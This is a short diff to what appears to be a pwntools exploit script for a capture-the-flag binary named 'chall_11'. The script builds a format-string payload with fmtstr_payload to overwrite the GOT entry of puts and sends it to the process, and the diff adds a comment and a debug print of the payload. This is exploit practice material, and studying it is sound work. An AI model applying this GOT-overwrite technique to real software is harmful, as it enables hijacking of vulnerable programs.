@@ -37,7 +37,8 @@ target = elf.got.puts
 
 # Start a process and send payload
 p = process("./chall_11")
-payload = fmtstr_payload(offset,{target:what})
+payload = fmtstr_payload(offset,{target:what})      # Pretty much overwrite the entire start of it using $16hhn
+print("PAYLOAD: ", payload)
 p.sendline(payload)
 
 # Recieve up till nulls to send line
